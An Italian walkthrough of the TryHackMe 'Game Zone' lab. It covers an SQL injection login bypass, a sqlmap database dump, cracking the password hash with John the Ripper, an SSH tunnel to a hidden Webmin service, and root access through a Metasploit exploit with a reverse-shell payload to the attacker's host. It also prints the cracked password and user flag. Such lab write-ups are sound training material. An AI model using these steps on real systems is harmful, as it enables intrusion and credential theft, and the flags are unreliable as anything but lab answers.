
#laboratorio #tryhackmelabs 

https://tryhackme.com/room/gamezone

In questa sala verranno trattati argomenti come SQLi (sfruttando questa vulnerabilità manualmente e tramite SQLMap ), come decifrare la password hash di un utente, come usare i tunnel SSH per rivelare un servizio nascosto e come usare un payload metasploit per ottenere privilegi di root

```
sudo nmap -Pn -O -v -p- 10.10.24.247
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```
nmap -sCV -p22,80 10.10.24.247
```

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Game Zone
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Vediamo con il browser
```
http://10.10.24.247/
```

Come si chiama il grande avatar cartoon che tiene in mano un cecchino sul forum?

facciamo un po di Reverse Image Search su internet dell'immagine trovata su

```
https://tineye.com/
```
troviamo questo articolo
https://www.ign.com/articles/2012/10/01/ign-presents-the-history-of-hitman?page=2
dove troviamo il nome del personaggio
```
Agent 47
```

#### Ottieni l'accesso tramite SQLi
In questa attività apprenderai maggiori informazioni su SQL (Structured Query Language) e su come puoi potenzialmente manipolare le query per comunicare con il database.

Rispondi alle domande seguenti

SQL è un linguaggio standard per l'archiviazione, la modifica e il recupero dei dati nei database. Una query può apparire così:

```
SELECT * FROM users WHERE username = :username AND password := password
```
Nel nostro sistema GameZone, quando provi ad accedere, i valori immessi, come nome utente e password, verranno presi e inseriti direttamente nella query precedente. Se la query trova dati, potrai accedere, altrimenti verrà visualizzato un messaggio di errore.

Ecco un potenziale punto di vulnerabilità: puoi inserire il tuo nome utente come un'altra query SQL. Questo richiederà la scrittura, il posizionamento e l'esecuzione della query.

Usiamo quanto appreso sopra per manipolare la query ed effettuare l'accesso senza credenziali legittime.

Se abbiamo impostato admin come nome utente e la nostra password come: 
```
' or 1=1 -- -
```
questo verrà inserito nella query e la nostra sessione verrà autenticata.

La query SQL che ora viene eseguita sul server web è la seguente:

**SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- -**

Il codice SQL aggiuntivo che abbiamo inserito come password ha modificato la query precedente interrompendo la query iniziale e procedendo (con l'utente amministratore)`se 1==1`, quindi commentando il resto della query per evitare che si interrompa.

GameZone non ha un utente amministratore nel database, tuttavia puoi comunque effettuare l'accesso senza conoscere alcuna credenziale, utilizzando i dati della password immessi che abbiamo usato nella domanda precedente.

Utilizza  ' o 1=1 -- - come nome utente e lascia vuota la password.

Una volta effettuato l'accesso, a quale pagina si viene reindirizzati?

```
' or 1=1 -- -
```

```
portal.php
```

#### Using SQLMap

SQLMap è un popolare strumento open source per l'iniezione automatica di SQL e il controllo automatico dei database. È preinstallato su tutte le versioni di [Kali Linux](https://tryhackme.com/rooms/kali) oppure può essere scaricato e installato manualmente [qui](https://github.com/sqlmapproject/sqlmap) .

Esistono molti tipi diversi di iniezione SQL (booleana/basata sul tempo, ecc.) e SQLMap automatizza l'intero processo provando diverse tecniche.

Utilizzeremo SQLMap per scaricare l'intero database per GameZone.

Utilizzando la pagina a cui abbiamo effettuato l'accesso in precedenza, indirizzeremo SQLMap alla funzione di ricerca delle recensioni dei giochi.  

Per prima cosa dobbiamo intercettare una richiesta effettuata alla funzione di ricerca tramite [BurpSuite](https://tryhackme.com/room/learnburp) .

```
nano request.txt
```
```
POST /portal.php HTTP/1.1
Host: 10.10.24.247
User-Agent: J
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://10.10.24.247
Connection: keep-alive
Referer: http://10.10.24.247/portal.php
Cookie: PHPSESSID=5ccuotbf3jjema6lptfph63p96
Upgrade-Insecure-Requests: 1

searchitem=test
```
Salviamo questa richiesta in un file di testo. Possiamo quindi passarla a SQLMap per utilizzare la nostra sessione utente autenticata.
```
sqlmap -r request.txt --dbms=mysql --dump
```
**-r** utilizza la richiesta intercettata salvata in precedenza  
**--dbms** indica a SQLMap che tipo di sistema di gestione del database è  
**--dump** tenta di restituire l'intero database

SQLMap proverà ora diversi metodi e identificherà quello vulnerabile. Alla fine, restituirà il database.
```
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+

[06:57:53] [INFO] table 'db.users' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.24.247/dump/db/users.csv'
[06:57:53] [INFO] fetching columns for table 'post' in database 'db'
[06:57:53] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[06:57:53] [INFO] fetching entries for table 'post' in database 'db'
Database: db
Table: post
[5 entries]
+----+--------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                                                                                                                                                                           |
+----+--------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical ad deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalentto a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                        |
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequl. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out ther, and a truly amazing offering across any system.                      |
+----+--------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

[06:57:53] [INFO] table 'db.post' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.24.247/dump/db/post.csv'
[06:57:53] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.24.247'

[*] ending @ 06:57:53 /2025-05-15/


```
Nella tabella degli utenti, qual è la password con hash?

```
ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
```

Qual era il nome utente associato alla password hash?

```
agent47
```

Come si chiamava l'altra tabella?

```
post
```

#### Cracking a password with JohnTheRipper

John the Ripper (JTR) è un cracker di password veloce, gratuito e open source. È preinstallato su tutte le macchine Kali Linux .

Useremo questo programma per decifrare l'hash ottenuto in precedenza. JohnTheRipper ha 15 anni e altri programmi come HashCat sono solo alcuni dei tanti programmi di cracking disponibili. 

Questo programma funziona prendendo una lista di parole, calcolandone l'hash con l'algoritmo specificato e confrontandolo con la password con hash. Se entrambe le password con hash sono identiche, significa che l'ha trovata. Non è possibile invertire un hash, quindi è necessario confrontarli.

```
nano hashpw.txt
```
```
ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
```

```
john hashpw.txt -wordlist=/usr/share/wordlists/rockyou.txt  --format=Raw-SHA256
```

```
└─# john hashpw.txt -wordlist=/usr/share/wordlists/rockyou.txt  --format=Raw-SHA256
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 SSE2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=3
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
videogamer124    (?)     
1g 0:00:00:00 DONE (2025-05-15 07:10) 3.448g/s 9999Kp/s 9999Kc/s 9999KC/s virgo5eris..vhunlex121
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed. 

```


Cos'è la password de-hashed?

```
videogamer124
```

Ora hai una password e un nome utente. Prova ad accedere al computer tramite SSH.

Cos'è il flag utente?

```
ssh agent47@10.10.24.247
```
	videogamer124

```
agent47@gamezone:~$ ls
user.txt
agent47@gamezone:~$ cat user.txt
649ac17b1480ac13ef1e4fa579dac95c
```

```
649ac17b1480ac13ef1e4fa579dac95c
```

#### Exposing services with reverse SSH tunnels

L'inoltro inverso delle porte SSH specifica che la porta specificata sull'host del server remoto deve essere inoltrata all'host e alla porta specificati sul lato locale.

**-L** è un tunnel locale (TU <-- CLIENTE). Se un sito è stato bloccato, puoi inoltrare il traffico a un server di tua proprietà e visualizzarlo. Ad esempio, se imgur è stato bloccato al lavoro, puoi eseguire  **ssh -L 9000:imgur.com:80 user@example.com.** Andando a localhost:9000 sul tuo computer, il traffico imgur verrà caricato tramite l'altro server.

**-R** è un tunnel remoto (TU --> CLIENT). Inoltri il tuo traffico all'altro server affinché altri possano visualizzarlo. Simile all'esempio precedente, ma al contrario.

Utilizzeremo uno strumento chiamato **ss**  per analizzare i socket in esecuzione su un host.

Se eseguiamo **ss -tulpn**  ci dirà quali connessioni socket sono in esecuzione
```
ss -tulpn
```

|   |   |
|---|---|
|**Discussione**|**Descrizione**|
|-T|Visualizza i socket TCP|
|-u|Visualizza socket UDP|
|-l|Visualizza solo i socket in ascolto|
|-P|Mostra il processo che utilizza il socket|
|-N|Non risolve i nomi dei servizi|
```
ss -tulpn
```
```
agent47@gamezone:~$ ss -tulpn
Netid State      Recv-Q Send-Q                                    Local Address:Port                                                   Peer Address:Port              
udp   UNCONN     0      0                                                     *:10000                                                             *:*                  
udp   UNCONN     0      0                                                     *:68                                                                *:*                  
tcp   LISTEN     0      128                                                   *:22                                                                *:*                  
tcp   LISTEN     0      80                                            127.0.0.1:3306                                                              *:*                  
tcp   LISTEN     0      128                                                   *:10000                                                             *:*                  
tcp   LISTEN     0      128                                                  :::22                                                               :::*                  
tcp   LISTEN     0      128                                                  :::80                                                               :::*   
```
Quanti socket TCP sono in esecuzione?
```
5
```

Possiamo vedere che un servizio in esecuzione sulla porta 10000 è bloccato dall'esterno tramite una regola del firewall (lo possiamo vedere dall'elenco IPtable). Tuttavia, utilizzando un tunnel SSH possiamo esporre la porta a noi (localmente)!

Dal nostro computer locale, esegui 
```
ssh -L 10000:localhost:10000 <nomeutente>@<ip>
```

```
ssh -L 10000:127.0.0.1:10000 agent47@10.10.24.247
```
	videogamer124
Una volta completato, digita "localhost:10000" nel tuo browser e potrai accedere al server web appena visualizzato.

```
http://localhost:10000/
```

Qual è il nome del CMS esposto?

```
Invia
```

Qual è la versione del CMS?

possiamo vederlo con nmap
```
nmap -sV -p 10000 127.0.0.1
```

e anche loggandoci 
```
http://localhost:10000/
```

```
10000/tcp open  http    MiniServ 1.580 (Webmin httpd)
```

```
Webmin
```
Qual è la versione del CMS?
```
1.580
```

#### Privilege Escalation with Metasploit

```
msfconsole
```

```
search Webmin
```

```
use exploit/unix/webapp/webmin_show_cgi_exec
```

```
show options
```

```
set USERNAME agent47
```

```
set PASSWORD videogamer124
```

```
set RHOSTS 127.0.0.1
 ```

```
set RPORT 10000
```

```
set payload cmd/unix/reverse
```

```
set SSL false
```

```
set LHOST 10.14.99.134
```

```
run
```

```
/bin/bash -i
```

```
whoami
```
root
```
cd /root
```

```
cat root.txt
```

```
root@gamezone:~# ls
ls
root.txt
root@gamezone:~# cat root.txt
cat root.txt
a4bxxxxxxxxxxxxxxxxxx
```
Qual'è il flag root?
```
a4bxxxxxxxxxxxxxxxxxxx
```

